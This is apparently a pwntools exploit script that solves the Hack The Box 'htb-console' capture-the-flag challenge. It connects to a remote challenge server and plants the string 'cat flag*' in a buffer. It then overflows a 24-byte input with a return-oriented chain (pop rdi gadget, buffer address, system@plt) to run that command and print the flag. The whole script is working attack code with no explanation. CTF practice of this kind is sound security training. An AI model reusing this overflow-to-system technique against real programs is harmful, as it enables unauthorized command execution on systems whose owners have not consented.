from pwn import *

LOCAL = False
elf = context.binary = ELF('./htb-console', checksec=False)
# context.log_level = 'debug'
if LOCAL:
	p = elf.process()
else:
	p = remote('138.68.182.108', '31892')


# Injecting our "cat flag*" string to hof
p.sendlineafter(">> ", "hof")
p.sendafter("Enter your name: ", "cat flag*\n")


# Executing system('cat flag*')
system = elf.plt['system']
pop_rdi = 0x401473

payload  = "A" * 24
payload += p64(pop_rdi)
payload += p64(0x4040b0)
payload += p64(system)

p.sendlineafter(">> ", "flag")
p.sendafter("Enter flag: ", payload)


# Grabbing the flag
p.recvuntil("Whoops, wrong flag!\n")
success(p.recvline())